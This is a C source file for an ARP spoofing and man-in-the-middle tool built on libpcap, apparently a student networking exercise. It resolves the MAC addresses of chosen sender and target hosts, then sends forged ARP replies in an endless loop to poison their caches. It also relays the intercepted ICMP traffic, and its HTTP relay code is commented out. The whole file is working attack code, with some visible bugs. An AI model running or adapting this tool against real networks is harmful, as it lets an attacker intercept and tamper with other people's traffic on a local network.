/* main.c */
#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/ether.h>		/* for ether_aton() */
#include <netinet/in.h>
#include <net/if.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <arpa/inet.h>			/* for inet_addr() */
#include "net_header.h"			/* Net Header Structure */
#include <pthread.h>			/* for pthread */
#include <dumpcode.h>

/*
    Global
 */
#define MAX_PACKET 65536

pthread_t *threads;
__thread byte tg_packet[MAX_PACKET];
pthread_mutex_t  gmutex = PTHREAD_MUTEX_INITIALIZER; //sync
pthread_cond_t gcond = PTHREAD_COND_INITIALIZER;

/*
 *  send_arp
 *  return : true(0), false(-1)
 *  make a arp packet & send a arp packet
 */
#define ETHER_SIZE  sizeof(struct libnet_ethernet_hdr)
#define ARP_SIZE    sizeof(struct libnet_arp_hdr)
#define ARP_DATA    sizeof(struct _arp_data)
#define PACKET_SIZE 256

int 
send_arp (
	pcap_t *handle, 
	pether_hdr peh, 
	parp_hdr pah, 
	parp_data pad
) {
    u_char packet[PACKET_SIZE] = {0, };

    memcpy(packet, peh, ETHER_SIZE);
    memcpy(packet+ETHER_SIZE, pah, ARP_SIZE);
    memcpy(packet+ETHER_SIZE+ARP_SIZE, pad, ARP_DATA);
    
    if(pcap_sendpacket(handle, packet, ETHER_SIZE+ARP_SIZE+ARP_DATA) != 0)
	return -1;

    return 0;
}


/*
 *  recv_arp
 *  return : true(0), false(-1)
 *  receive a arp reply packet
 */

int 
recv_arp (
	pcap_t *handle, 
	byte* tmac
) {
    struct pcap_pkthdr header;        /* The header that pcap gives us */
    const u_char *packet;             /* The actual packet */

    while(1) {
	if(pcap_next_ex(handle, (struct pcap_pkthdr **)&header, &packet) == 1) {
	    if(((pether_hdr)packet)->ether_type == htons(ETHERTYPE_ARP)) {
		packet += ETHER_SIZE;

		if(((parp_hdr)packet)->ar_op == htons(ARPOP_REPLY)) {
		    packet += ARP_SIZE;

		    memcpy(
			    tmac, 
			    ether_ntoa(
				(const struct ether_addr*)((parp_data)packet)->sender_ha), 
			    ETHER_ADDRSTRLEN); 
		    break;
		} else return -1;
	    }
	}
    }

    return 0;
}


/*
 *  normal_arp
 *  return : true(1), false(0)
 *  normal arp request & reply
 */
int 
normal_arp (
	pcap_t *handle, 
	const byte* smac, 
	const byte* sip, 
	BYTE* tmac, 
	const byte* tip
) {
    ether_hdr eh;			/* Ethernet Header */
    arp_hdr ah;				/* ARP Header */
    arp_data ad;			/* ARP Data */

    /* Setting Ethernet_Header */
    memset(&eh.ether_dhost, -1, ETHER_ADDR_LEN);
    memcpy(&eh.ether_shost, ether_aton(smac), ETHER_ADDR_LEN);
    eh.ether_type = ntohs(ETHERTYPE_ARP);

    /* Setting ARP_Header */
    ah.ar_hrd = ntohs(ARPHRD_ETHER);
    ah.ar_pro = ntohs(ETHERTYPE_IP);
    ah.ar_hln = ETHER_ADDR_LEN;
    ah.ar_pln = IP_ADDR_LEN;
    ah.ar_op = ntohs(ARPOP_REQUEST);

    /* Setting ARP_Data */
    memcpy(&ad.sender_ha, ether_aton(smac), ETHER_ADDR_LEN);
    ad.sender_ip = inet_addr(sip);
    memset(&ad.target_ha, 0, ETHER_ADDR_LEN);
    ad.target_ip = inet_addr(tip);

    send_arp(handle, &eh, &ah, &ad);
    puts("send Normal ARP Requset...");
    if(!recv_arp(handle, (byte*)tmac)) {
	puts("Success to get MAC Address");
	return 1;
    }

    puts("Failed to get MAC Address");
    return 0;
}


/*
 *  arp_infection
 *  return : X
 *  infect arp request
 */
void 
arp_infection (
	pcap_t *handle, 
	const byte* my_mac, 
	const byte* tip, 
	const byte* smac, 
	const byte* sip
) {
    ether_hdr eh;			/* Ethernet Header */
    arp_hdr ah;				/* ARP Header */
    arp_data ad;			/* ARP Data */

    /* Setting Ethernet_Header */
    memcpy(&eh.ether_dhost, ether_aton(smac), ETHER_ADDR_LEN);
    memcpy(&eh.ether_shost, ether_aton(my_mac), ETHER_ADDR_LEN);
    eh.ether_type = ntohs(ETHERTYPE_ARP);

    /* Setting ARP_Header */
    ah.ar_hrd = ntohs(ARPHRD_ETHER);
    ah.ar_pro = ntohs(ETHERTYPE_IP);
    ah.ar_hln = ETHER_ADDR_LEN;
    ah.ar_pln = IP_ADDR_LEN;
    ah.ar_op = ntohs(ARPOP_REPLY);

    /* Setting ARP_Data */
    memcpy(&ad.sender_ha, ether_aton(my_mac), ETHER_ADDR_LEN);
    ad.sender_ip = inet_addr(tip);
    memcpy(&ad.target_ha, ether_aton(smac), ETHER_ADDR_LEN);
    ad.target_ip = inet_addr(sip);

    while(1) {
	pthread_mutex_lock(&gmutex);
	printf("The thread continues to send infect arp reply....\n");
	send_arp(handle, &eh, &ah, &ad);
	pthread_cond_signal(&gcond);
	pthread_mutex_unlock(&gmutex);
	sleep(3);
    }
}

/*
 *  packet_relay
 *  return : true(1), false(0)
 *  packet relay between sender and target.
 */

#define Packet_Len(x)	(((pipv4_hdr)x)->ip_len)+14
#define Filter		"icmp"

int
packet_relay (
	pcap_t *handle,
	p_addr_list my_al
) {
    //ether_hdr eh;

    struct bpf_program fp;		    /* The compiled filter */
    byte filter_exp[] = Filter;		    /* The fileter expression */
    bpf_u_int32 net = 0;		    /* Our IP */
    struct pcap_pkthdr header;		    /* The header that pcap gives us */
    const u_char *packet;		    /* The actual packet */
    const u_char *packet_ptr;		    /* packet pointer */
    DWORD total_len;			    /* packet's total length */
    DWORD header_len;			    /* packet's header(ethernet, ip, tcp) len */

    if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
	fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
	return(0);
    }
    if(pcap_setfilter(handle, &fp) == -1) {
	fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
	return(0);
    }
    
    while(1) {
	puts("MITM...");
	if(pcap_next_ex(handle, (struct pcap_pkthdr **)&header, &packet) == 1) {
	    packet_ptr = packet;

	    if(((pether_hdr)packet_ptr)->ether_type == htons(ETHERTYPE_IP)) {
		packet_ptr += ETHER_SIZE;
		header_len = ETHER_SIZE;

		if(((pipv4_hdr)packet_ptr)->ip_p == IPPROTO_ICMP) {
		    total_len = Packet_Len(packet_ptr);
		    header_len += ((((pipv4_hdr)packet_ptr)->ip_hl)*4);
		    packet_ptr += ((((pipv4_hdr)packet_ptr)->ip_hl)*4);

		    /*
		    if(((ptcp_hdr)packet_ptr)->th_dport == 80) {
			header_len += ((((ptcp_hdr)packet_ptr)->th_off)*4);
			packet_ptr += ((((ptcp_hdr)packet_ptr)->th_off)*4);
	
			// relay to target from sender
			memcpy(tg_packet, packet, total_len);
			memcpy(&(((pether_hdr)tg_packet)->ether_shost), 
				my_al->mac, 
				ETHER_ADDR_LEN);

			dumpcode(tg_packet+header_len, total_len-header_len);
			pcap_sendpacket(handle, (BYTE*)tg_packet, total_len);
		    } else if(((ptcp_hdr)packet_ptr)->th_sport == 80) {
			packet_ptr += ((((ptcp_hdr)packet_ptr)->th_off)*4);

			// relay to sender from target
			memcpy(tg_packet, packet, total_len);
			memcpy(&(((pether_hdr)tg_packet)->ether_dhost), 
				my_al->mac, 
				ETHER_ADDR_LEN);

			dumpcode(tg_packet+header_len, total_len-header_len);
			pcap_sendpacket(handle, (BYTE*)tg_packet, total_len);
		    } else continue; */
		}
	    }
	}
    }

    return 1;
}

/*
 *  convrt_mac
 *  return : X
 *  Convert 6 bytes address to MAC Address string
 */
void 
convrt_mac ( 
	const byte *data, 
	byte *cvrt_str, 
	int sz 
) {
    char buf[ETHER_ADDRSTRLEN] = {0, };
    char t_buf[8];
    char *stp = strtok( (char *)data , ":" );
    int temp=0;
    do
    {
        memset( t_buf, 0x0, sizeof(t_buf) );
        sscanf( stp, "%x", &temp );
        snprintf( t_buf, sizeof(t_buf)-1, "%02X", temp );
        strncat( buf, t_buf, sizeof(buf)-1 );
        strncat( buf, ":", sizeof(buf)-1 );
    } while( (stp = strtok( NULL , ":" )) != NULL );
    buf[strlen(buf) -1] = '\0';
    strncpy( cvrt_str, buf, sz );
}


/*
 *  get_my_MAC
 *  return : true(0), false(-1)
 *  Get My MAC Address
 */
#define REQ_CNT 20

int 
get_my_mac (
	p_addr_list my_al
) {
    int sockfd, cnt, req_cnt = REQ_CNT;
    struct sockaddr_in *sock;
    struct ifconf ifcnf_s;
    struct ifreq *ifr_s;
    sockfd = socket( PF_INET , SOCK_DGRAM , 0 );
    if( sockfd < 0 ) {
	perror( "socket()" );
	return -1;
    }
    memset( (void *)&ifcnf_s , 0x0 , sizeof(ifcnf_s) );
    ifcnf_s.ifc_len = sizeof(struct ifreq) * req_cnt;
    ifcnf_s.ifc_buf = malloc(ifcnf_s.ifc_len);
    if( ioctl( sockfd, SIOCGIFCONF, (char *)&ifcnf_s ) < 0 ) {
        perror( "ioctl() - SIOCGIFCONF" );
        return -1;
    }
    
    if( (DWORD)ifcnf_s.ifc_len > (DWORD)(sizeof(struct ifreq) * req_cnt) ) {
        req_cnt = ifcnf_s.ifc_len;
        ifcnf_s.ifc_buf = realloc( ifcnf_s.ifc_buf, req_cnt );
    }
    ifr_s = ifcnf_s.ifc_req;
    for( cnt = 0 ; cnt < ifcnf_s.ifc_len ; cnt += sizeof(struct ifreq), ifr_s++ )
    {
        if( ioctl( sockfd, SIOCGIFFLAGS, ifr_s ) < 0 ) {
            perror( "ioctl() - SIOCGIFFLAGS" );
            return -1;
        }
        
	if( ifr_s->ifr_flags & IFF_LOOPBACK )
            continue;
	sock = (struct sockaddr_in *)&ifr_s->ifr_addr;
	memcpy(my_al->ip, inet_ntoa(sock->sin_addr), INET_ADDRSTRLEN);
        if( ioctl( sockfd, SIOCGIFHWADDR, ifr_s ) < 0 ) {
            perror( "ioctl() - SIOCGIFHWADDR" );
            return -1;
        }
        convrt_mac(
		(const char*)ether_ntoa(
		    (struct ether_addr *)(ifr_s->ifr_hwaddr.sa_data)), 
		(char*)my_al->mac, ETHER_ADDRSTRLEN);
	printf("My IP Address : %s\n", my_al->ip);
	printf("My MAC Address : %s\n", my_al->mac);
    }

    free(ifcnf_s.ifc_buf);

    return 0;
}

/*
 *  arp_spoof
 *  return : void* arp_spoof(void *arg)
 *  one arp_spoof process per 2 addresses(Sender, Target)
 */

void*
arp_spoof (
	void *arg
) {
    thr_arg *argv = (thr_arg*)arg;
    pcap_t *handle = argv->handle;
    p_addr_list my_al = argv->my_al;
    p_addr_list s_al = argv->s_al;
    p_addr_list t_al = argv->t_al;

    // Get Sender's MAC Address
    if(normal_arp(
		handle, 
		(const byte*)my_al->mac, 
		(const byte*)my_al->ip, 
		s_al->mac, 
		(const byte*)s_al->ip)
    && normal_arp(
		handle,
		(const byte*)my_al->mac,
		(const byte*)my_al->ip,
		t_al->mac,
		(const byte*)t_al->ip)) 
    {
	puts("===== ARP Request Result ====");
	printf("Sender's IP  Address : %s\n", s_al->ip);
	printf("Sender's MAC Address : %s\n", s_al->mac);
	puts("=============================");
	printf("Target's MAC Address : %s\n", t_al->ip);
	printf("Target's MAC Address : %s\n", t_al->mac);
	puts("=============================");

	arp_infection(
		handle, 
		(const byte*)my_al->mac, 
		(const byte*)t_al->ip, 
		(const byte*)s_al->mac, 
		(const byte*)s_al->ip);
	arp_infection(
		handle,
		(const byte*)my_al->mac,
		(const byte*)s_al->ip,
		(const byte*)t_al->mac,
		(const byte*)t_al->ip);

	//relay
	//packet_relay(handle, my_al);
    }

    return ((void *)0);
}


/*
 *  main
 *  return : true(0), false
 *  Main Function
 */
#define PROMISC	    1
#define NONPROMISC  0
#define TIME_OUT    1000

int 
main (
	int argc, 
	char *argv[]
) {
    pcap_t *handle;			/* Session Handle */
    char *dev;				/* Interface */
    DWORD gen_num;			/* Generated Number */
    p_addr_list s_al;			/* Sender's Linked List */
    p_addr_list t_al;			/* Target's Linked List */
    addr_list my_al;			/* My Linked List */
    char errbuf[PCAP_ERRBUF_SIZE];	/* Error String */
    thr_arg *p_ta;			/* Thread Arguments */
    int status;				/* Trhead process result */

    if((argc <= 4) && ((argc%2) != 0)) {
        fprintf(stderr, "Usage : %s <interface> <sender ip> <target ip> [<sender ip> <target ip>...]\n", argv[0]);
        return(2);
    }

    gen_num = (argc/2)-1;

    s_al = (p_addr_list) malloc(sizeof(addr_list)*gen_num);
    memset(s_al, 0, sizeof(addr_list)*gen_num);
   
    t_al = (p_addr_list) malloc(sizeof(addr_list)*gen_num);
    memset(t_al, 0, sizeof(addr_list)*gen_num);
    for(DWORD i=0; i<gen_num; i++) {
	strncpy((char *__restrict)s_al[i].ip, argv[2+(i*2)], INET_ADDRSTRLEN);
	strncpy((char *__restrict)t_al[i].ip, argv[(i*2)+3], INET_ADDRSTRLEN);
    }

    dev = argv[1];

    get_my_mac(&my_al);

    /* Nonpromiscuous mode */
    handle = pcap_open_live(dev, BUFSIZ, PROMISC, TIME_OUT, errbuf);
    if (handle == NULL) {
    	fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
    	return(2);
    }

    // per threads
    threads = (pthread_t*) malloc(sizeof(pthread_t)*gen_num);
    memset(threads, 0, sizeof(pthread_t)*gen_num);

    p_ta = (thr_arg*) malloc(sizeof(thr_arg)*gen_num);
    memset(p_ta, 0, sizeof(thr_arg)*gen_num);

    pthread_mutex_lock(&gmutex);
    for(DWORD i=0; i<gen_num; i++) {
	p_ta[i].handle = handle;
	p_ta[i].my_al = &my_al;
	p_ta[i].s_al = &s_al[i];
	p_ta[i].t_al = &t_al[i];

	if(pthread_create(&threads[i], NULL, &arp_spoof, (void *)&p_ta[i]) < 0) {
	    printf("pthread_create error\n");
	    return -1;
	}
	pthread_detach(threads[i]);
    }
     
    pthread_cond_wait(&gcond, &gmutex); //block
    pthread_mutex_unlock(&gmutex);
    packet_relay(handle, &my_al);

    /* And close the session */
    pcap_close(handle);
	    
    free(s_al);
    free(t_al);

    return(0);
}
